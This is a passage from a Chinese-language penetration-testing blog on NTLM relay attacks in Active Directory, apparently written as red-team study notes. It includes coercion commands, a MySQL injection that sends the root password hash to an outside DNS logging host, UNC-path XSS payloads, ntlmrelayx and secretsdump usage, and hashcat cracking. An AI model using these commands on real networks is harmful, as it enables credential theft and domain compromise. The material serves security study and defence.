<h4 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="* 打印机漏洞"></a>* 打印机漏洞</h4><p>使用 <a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">SpoolSample</a>工具或者 <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug.py</a>。原理就是 RPC 调用，可以未授权强制任何机器调用。后来微软修复成允许授权的用户进行调用。</p>
<p>让 TargetIP2 去访问 TargetIP1。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py -no-pass &lt;TargetIP2&gt; &lt;TargetIP1&gt; </span><br></pre></td></tr></table></figure>

<h4 id="PetitPotam漏洞"><a href="#PetitPotam漏洞" class="headerlink" title="* PetitPotam漏洞"></a>* PetitPotam漏洞</h4><p>MS-EFSR中有一组API，可通过FileName参数指定UNC路径。例如，EfsRpcOpenFileRaw API的语法格式如下，可以打开服务器上的加密对象进行备份或还原。这个被称为 PetitPotam 的漏洞通过强制“Windows 主机通过 MS 向其他机器进行身份验证而起作用” -EFSRPC EfsRpcOpenFileRaw 函数。</p>
<p>PetitPotam.py PetitPotam.exe</p>
<h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>我们知道在MySQL注入的话，是可以通过带外通信把数据带出来。语法如下。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>需要具备loadfile权限，且没有securefile_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)</p>
<p>仔细观察我们会发现LOAD_FILE是支持UNC路劲</p>
<p>我们构造</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">load_file</span>(<span class="params"><span class="string">&#x27;\\\\172.16.100.1\\mysql&#x27;</span></span>)</span>;</span><br></pre></td></tr></table></figure>

<p>拿到net-ntlm hash</p>
<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>构造一个源为unc路径到xss标签即可，如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;\\172.16.100.1\xss&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这种情况只适用于IE和Edge浏览器，其他浏览器不允许从http域跨域到file域。</p>
<p>尝试不通过UNC路径，就xss里面访问http请求来发起认证，即</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script scr=&quot;//172.16.100.1/x&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>但此时又会出现之前的问题，弹出一个认证框。</p>
<p>Internet设置中还有一个选项是，“仅在Intranet区域中自动登录”，如果将用户身份验证设置为这一项的话，如果访问的域名是位于企业内部网或存在于可信站点列表中，即不会弹出认证框直接抓到NTLM Hash。</p>
<p>通常许多组织会将子域名所托管的所有数据标记为可信数据，如下图所示，<code>*.adlab1.local</code>在白名单中，那么测试人员只需获取<code>*.adlab1.local</code>下的某台服务器，使用该服务器启动Responder监听，就可以让浏览器自动以登录用户的凭据发起NTLM认证。</p>
<p>不过我们自己构造一个域名位于企业内部网，就可以不弹出认证框，直接抓取到NTLM Hash。默认域内的认证用户都可以在DNS里面创建子对象，也就是只要我们是域用户就可以在域内添加一条DNS记录。</p>
<p><strong>使用Powermad工具里面的Invoke-DNSUpdate添加一条DNS记录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-DNSUpdate.ps1</span><br><span class="line">Invoke-DNSUpdate -DNSType A -DNSName xss -DNSData 192.168.111.1</span><br></pre></td></tr></table></figure>

<p>然后构造xss代码形式如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://xss.nsfocus.com/xss&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>使用浏览器打开即可触发</p>
<p>内网地址测试下来是要认证的，添加dns后访问域名应该不用额外认证</p>
<h4 id="AD-CS-PKI"><a href="#AD-CS-PKI" class="headerlink" title="AD CS&#x2F;PKI"></a>AD CS&#x2F;PKI</h4><p>再打了补丁的环境下，如果域环境开启了AD CS，我们就可以利用AD CS进行攻击。</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>直接解密</p>
<p>可以选择通过hashcat进行爆破，这里选择的是字典的爆破形式。</p>
<p><code>hashcat.exe -m 5600 hash.txt pass.txt --force</code></p>
<h3 id="中继"><a href="#中继" class="headerlink" title="中继"></a>中继</h3><h4 id="协议转换"><a href="#协议转换" class="headerlink" title="协议转换"></a>协议转换</h4><p>先上图</p>
<p><img src="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_ntlm_relay_mitigation_chart.png" alt="img"></p>
<h5 id="关于LDAP签名"><a href="#关于LDAP签名" class="headerlink" title="关于LDAP签名"></a>关于LDAP签名</h5><p>内网一般来说只有域控开启了 LDAP。</p>
<p>服务端 LDAP 默认设置的 1 是协商签名，说明服务端有签名的能力，要不要签名由客户端来控制，2 则是强制签名，客户端必须支持签名，设置为 0 代表不需要签名。</p>
<p>可以通过 LDAPServerIntegrity 来确认服务端签名设置情况。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v LDAPServerIntegrity</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters</span><br><span class="line">    LDAPServerIntegrity    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>

<p>客户端通过 LdapClientIntegrity 来看客户端签名设置情况。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\gbb&gt; reg query HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LDAP /v LdapClientIntegrity</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LDAP</span><br><span class="line">    LdapClientIntegrity    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>

<p>SMB To LDAP 则提示客户端有签名，也查询了客户端没有开启签名。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo impacket-ntlmrelayx -t ldap://192.168.37.1 -smb2support --no-http-server --no-wcf-server --no-raw-server</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h5 id="SMB2SMB"><a href="#SMB2SMB" class="headerlink" title="SMB2SMB"></a>SMB2SMB</h5><p>能不能通过 SMB 中继回受害者自己的 SMB 呢？这样方便进行提权到 SYSTEM，从目前执行结果来看是失败的。但 2008 年是可以的，叫 NTLM Reflection，后来被微软被修复，漏洞编号是 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-068#smb-credential-reflection-vulnerability---cve-2008-4037">MS08-068</a>（CVE-2008-4037）。</p>
<p>不过已经有一篇 <a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html">Ghost Potato</a> 文章中介绍了 CVE-2019-1384 反射绕过方式，在 ntlmrelayx.py 中通过 –gpotato-startup 选项实现了此利用方式，比如 –gpotato-startup 1.exe，则会将 1.exe 上传到目标启动目录。</p>
<h5 id="SMB2LDAP"><a href="#SMB2LDAP" class="headerlink" title="SMB2LDAP"></a>SMB2LDAP</h5><p>需要有漏洞CVE-2019-1040才能这么利用</p>
<p>Drop the MIC (CVE-2019-1040) </p>
<h5 id="Relay2SMB"><a href="#Relay2SMB" class="headerlink" title="Relay2SMB"></a>Relay2SMB</h5><p>如果没有限制域用户登录到某台机子，那就可以将该域用户Relay到别人的机子，或者是拿到域控的请求，将域控Relay到普通的机子，比如域管运维所在的机子。(为啥不Relay到其他域控，因为域内就域控默认开启smb签名)</p>
<h5 id="Relay2HTTP"><a href="#Relay2HTTP" class="headerlink" title="Relay2HTTP"></a>Relay2HTTP</h5><p>Exchange的认证也是支持NTLM SSP的。我们可以Relay的Exchange，从而收发邮件，代理等等。<br>这里可以利用利用工具<a target="_blank" rel="noopener" href="https://github.com/Arno0x/NtlmRelayToEWS.git">NtlmRelayToEWS</a>。</p>
<h4 id="利用方向"><a href="#利用方向" class="headerlink" title="利用方向"></a>利用方向</h4><p>Relay到ldap是在域渗透里面，<strong>最好用</strong>的一个。Relay可以做什么呢？</p>
<p>1、高权限用户<br>如果NTLM发起用户在以下用户组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Enterprise admins</span><br><span class="line">Domain admins</span><br><span class="line">Built-in Administrators</span><br><span class="line">Backup operators</span><br><span class="line">Account operators</span><br></pre></td></tr></table></figure>

<p>那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管。</p>
<p>2、Write-acl 权限</p>
<p>如果发起者对<code>DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</code>和 <code>DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</code>有<code>write-acl</code>权限，那么就可以在该acl里面添加任意用户，从而使得该用户可以具备<code>dcsync</code>的权限。</p>
<p>3、普通用户权限</p>
<p>在Server2012R2之后，如果没有以上两个权限。可以通过设置基于资源的约束委派。<br>在NTLM发起者属性<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>里面添加一条ace,可以让任何机器用户和服务用户可以控制该用户(NTLM发起者),在这里可能需要新增一台Computer账号或者控制一台机器。</p>
<p>在Server2016之后，支持属性<code>msDS-KeyCredentialLink</code>,添加了这个属性以后，就可以利用证书来获取对应主机权限，详细可参考<a target="_blank" rel="noopener" href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials</a>。</p>
<h4 id="配合利用"><a href="#配合利用" class="headerlink" title="配合利用"></a>配合利用</h4><h5 id="获取-SAM-hashs"><a href="#获取-SAM-hashs" class="headerlink" title="获取 SAM hashs"></a>获取 SAM hashs</h5><h5 id="针对-ADCS-的攻击"><a href="#针对-ADCS-的攻击" class="headerlink" title="针对 ADCS 的攻击"></a>针对 ADCS 的攻击</h5><h5 id="针对-域内主机资源的-RBCD-攻击"><a href="#针对-域内主机资源的-RBCD-攻击" class="headerlink" title="针对 域内主机资源的 RBCD 攻击"></a>针对 域内主机资源的 RBCD 攻击</h5><h5 id="针对-当前计算机的攻击"><a href="#针对-当前计算机的攻击" class="headerlink" title="针对 当前计算机的攻击"></a>针对 当前计算机的攻击</h5><h5 id="针对-影子账户的攻击"><a href="#针对-影子账户的攻击" class="headerlink" title="针对 影子账户的攻击"></a>针对 影子账户的攻击</h5><p>后面将这些内容补上</p>
<h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h4><h5 id="ntlmrelay的Socks功能"><a href="#ntlmrelay的Socks功能" class="headerlink" title="ntlmrelay的Socks功能"></a>ntlmrelay的Socks功能</h5><p>使用 -socks 只要中继成功就会在本地 1080 监听端口自动维持会话有效性，后续通过代理 impacket 客户端工具流量到 1080 端口利用会话，只是目前<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/tree/master/impacket/examples/ntlmrelayx/servers/socksplugins">支持的 socks 的服务</a>有点少，有 http、https、iamp、iamps、mssql、smb、smtp。proxychains记得填socks4</p>
<p>当有连接被成功利用自动建立会话，可以用 socks 命令查看有哪些目标 Relay 成功。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx  -t smb://10.10.10.3  -socks  -smb2support</span><br></pre></td></tr></table></figure>

<p>通过查询本地 socks 端口，确实 1080 被开启。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -pant | grep 1080</span><br></pre></td></tr></table></figure>

<p>通过 proxychains 代理到 1080 上执行命令。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-secretsdump  ADLAB1/administrator:radomtext@10.10.10.3 </span><br></pre></td></tr></table></figure>

<p>根据测试，遵循smb的relay特性，即使有时候socks开下来了但有签名问题也用不了</p>
<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><h3 id="特性利用"><a href="#特性利用" class="headerlink" title="特性利用"></a>特性利用</h3><p>上图片</p>
<p><img src="https://raw.githubusercontent.com/5gstudent/imageHost/main/blog_NTLM%20relay.png" alt="img"></p>
<h4 id="session签名"><a href="#session签名" class="headerlink" title="session签名"></a>session签名</h4><p>只有SMB和LDAP能使用</p>
<ul>
<li>SMB签名：只要有一方不需要签名就不用</li>
<li>LDAP签名：只要双方都支持签名就要签名</li>
</ul>
<p>确认 Relay 目标，找到哪些机器没开启签名</p>
<p>如果提供 SMB 服务的服务器要求签名，那我们攻击会失败。启用服务端签名是在注册表中将 RequireSecuritySignature 设置为 1。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// SMB 服务端启用签名</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>

<p>默认情况下除域控外都没开启签名。如果使用的是 SMB3 会默认开启签名，不过现在默认运行的都是 SMB2 默认是不需要签名的。</p>
<h5 id="搜集工具"><a href="#搜集工具" class="headerlink" title="搜集工具"></a>搜集工具</h5><ol>
<li>CrackMapExec</li>
</ol>
<p>工具功能很丰富，比较接近impacket</p>
<p>–gen-relay-list 选项直接将能够 Relay 的 IP 存入 relayTargets.txt 中。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 直接扫网段</span><br><span class="line">cme smb &lt;IPv4 CIDR&gt; --gen-relay-list relayTargets.txt</span><br><span class="line"></span><br><span class="line"># 扫指定主机，多个主机可以用空格隔开</span><br><span class="line">cme smb &lt;IP&gt; --gen-relay-list relayTargets.txt</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Responder 的工具 <a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder/blob/master/tools/RunFinger.py">RunFinger.py</a>。</li>
</ol>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python RunFinger.py -i &lt;网段&gt;/&lt;子网&gt;</span><br><span class="line">responder-RunFinger -i &lt;网段&gt;/&lt;子网&gt;</span><br></pre></td></tr></table></figure>

<p>根据 Signing:’False’ 判断没开启签名。</p>
<ol start="3">
<li>Nmap</li>
</ol>
<p>nmap 的 nes 脚本 <a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/scripts/smb-security-mode.html">smb-security-mode.nse</a>。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 扫网段</span><br><span class="line">nmap --script=smb-security-mode.nse -p 445 -n -Pn --open &lt;CIDR&gt;</span><br></pre></td></tr></table></figure>

<h4 id="MIC"><a href="#MIC" class="headerlink" title="MIC"></a>MIC</h4><p>Message Integrity Code（信息完整性代码）</p>
<p>Unlike session signing, MIC protects the authentication.</p>
<p>Drop the MIC (CVE-2019-1040)  </p>
<p>Drop the MIC 2 (CVE-2019-1166)</p>
<p>Stealing the session key (CVE-2019-1019)</p>
<p>Reminder: if NTLMv1 is accepted, NTLM could be relayed and modified and the MIC dropped </p>
<h4 id="EPA"><a href="#EPA" class="headerlink" title="EPA"></a>EPA</h4><p>Extended Protection for Auth（身份验证扩展保护）</p>
<p>EPA可以为HTTPS和LDAPS等不支持会话签名的协议提供NTLM中继缓解措施</p>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><h3 id="没有能用的linux？"><a href="#没有能用的linux？" class="headerlink" title="没有能用的linux？"></a>没有能用的linux？</h3><p>用windows监听445再转发</p>
<p><a target="_blank" rel="noopener" href="https://github.com/praetorian-inc/PortBender">https://github.com/praetorian-inc/PortBender</a></p>
<p>转发端口</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/656">https://forum.butian.net/share/656</a></p>
<h3 id="设想"><a href="#设想" class="headerlink" title="设想"></a>设想</h3><ol>
<li>假设没有任何域权限，只有一台内网机器。先想办法通过中继获取一个域机器账户，这样就可以进行LDAP导出、触发高权限机器的2次中继，进而获取其他机器权限。</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面的表格是一个简单的总结，上面东西比较多写的也比较乱，回头看看重新梳理一下。</p>
<table>
<thead>
<tr>
<th>MITM 方式</th>
<th>ADIDNS</th>
<th>LLMNR</th>
<th>NBNS</th>
<th>DHCPv6</th>
<th>ARP</th>
<th>DNS</th>
<th>WPAD</th>
<th>PrinterBug</th>
<th>PrivExchange</th>
</tr>
</thead>
<tbody><tr>
<td>可能需要等待复制&#x2F;同步</td>
<td>x</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>易于实施攻击</td>
<td></td>
<td>x</td>
<td>x</td>
<td>takes ~5 minutes to revert</td>
<td>revert time depends on targets arp cache timeout (usually ~60 sec</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>默认设置可利用</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>up to 2019</td>
</tr>
<tr>
<td>影响FQN请求</td>
<td>x</td>
<td>not if wildcard ADIDNS record exists</td>
<td>not if wildcard ADIDNS record exists</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>需要持续网络流量欺骗</td>
<td></td>
<td>x</td>
<td>x</td>
<td>x</td>
<td></td>
<td>x</td>
<td>x</td>
<td></td>
<td></td>
</tr>
<tr>
<td>需要域凭据</td>
<td>x</td>
<td></td>
<td></td>
<td></td>
<td>x</td>
<td></td>
<td></td>
<td>x</td>
<td>requires emails-capable account</td>
</tr>
<tr>
<td>需要编辑AD</td>
<td>x</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>需要一个高权限能控的主机</td>
<td></td>
<td>x</td>
<td></td>
<td></td>
<td>x</td>
<td>x</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>要和目标机器在同一个网段</td>
<td></td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td></td>
<td></td>
<td>x</td>
<td>x</td>
</tr>
<tr>
<td>干扰</td>
<td>low</td>
<td>low</td>
<td>low</td>
<td>low to high</td>
<td>low to high</td>
<td>low to high</td>
<td>low to high</td>
<td>none</td>
<td>none</td>
</tr>
</tbody></table>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193493">https://www.anquanke.com/post/id/193493</a></p>
<p><a target="_blank" rel="noopener" href="https://juggernaut-sec.com/ntlm-relay-attacks/">https://juggernaut-sec.com/ntlm-relay-attacks/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/jas502n/sangfor/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md">https://github.com/jas502n/sangfor/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/94689">https://www.anquanke.com/post/id/94689</a></p>
<p><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/a-d/movement/ntlm/relay">https://www.thehacker.recipes/a-d/movement/ntlm/relay</a></p>
<p><a target="_blank" rel="noopener" href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=b0lLxLJKaRs&t=480s">https://www.youtube.com/watch?v=b0lLxLJKaRs&amp;t=480s</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/5gstudent">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">触发方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%EF%BC%88%E9%B8%A1%E8%82%8B%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">系统命令（鸡肋）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC"><span class="toc-number">1.2.</span> <span class="toc-text">钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scf-%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">scf 文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#desktop-ini"><span class="toc-number">1.2.2.</span> <span class="toc-text">desktop.ini</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%A4%B4%E5%83%8F"><span class="toc-number">1.2.3.</span> <span class="toc-text">用户头像</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#office"><span class="toc-number">1.2.4.</span> <span class="toc-text">office</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#outlook"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">outlook</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PDF"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">PDF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#word-%E6%96%87%E6%A1%A3%E7%9A%84-document-xml-xrels"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">word 文档的 document.xml.xrels</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WordPad-OLE-%E6%B3%84%E9%9C%B2-Hash"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">WordPad OLE 泄露 Hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Access-Linked-Table-Feature"><span class="toc-number">1.2.4.5.</span> <span class="toc-text">Access Linked Table Feature</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8A%95%E6%AF%92"><span class="toc-number">1.3.</span> <span class="toc-text">内网投毒</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LLMNR-NBNS-M-DNS"><span class="toc-number">1.3.1.</span> <span class="toc-text">LLMNR NBNS (M)DNS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WPAD%E5%92%8Cmitm6"><span class="toc-number">1.3.2.</span> <span class="toc-text">WPAD和mitm6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞触发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Coerce"><span class="toc-number">1.4.1.</span> <span class="toc-text">Coerce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.2.</span> <span class="toc-text">* 打印机漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PetitPotam%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.3.</span> <span class="toc-text">* PetitPotam漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL"><span class="toc-number">1.4.4.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS"><span class="toc-number">1.4.5.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AD-CS-PKI"><span class="toc-number">1.4.6.</span> <span class="toc-text">AD CS&#x2F;PKI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">2.1.</span> <span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E7%BB%A7"><span class="toc-number">2.2.</span> <span class="toc-text">中继</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2"><span class="toc-number">2.2.1.</span> <span class="toc-text">协议转换</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELDAP%E7%AD%BE%E5%90%8D"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">关于LDAP签名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB2SMB"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">SMB2SMB</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SMB2LDAP"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">SMB2LDAP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Relay2SMB"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">Relay2SMB</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Relay2HTTP"><span class="toc-number">2.2.1.5.</span> <span class="toc-text">Relay2HTTP</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%90%91"><span class="toc-number">2.2.2.</span> <span class="toc-text">利用方向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.3.</span> <span class="toc-text">配合利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-SAM-hashs"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">获取 SAM hashs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-ADCS-%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">针对 ADCS 的攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA%E8%B5%84%E6%BA%90%E7%9A%84-RBCD-%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.3.3.</span> <span class="toc-text">针对 域内主机资源的 RBCD 攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-%E5%BD%93%E5%89%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.3.4.</span> <span class="toc-text">针对 当前计算机的攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.3.5.</span> <span class="toc-text">针对 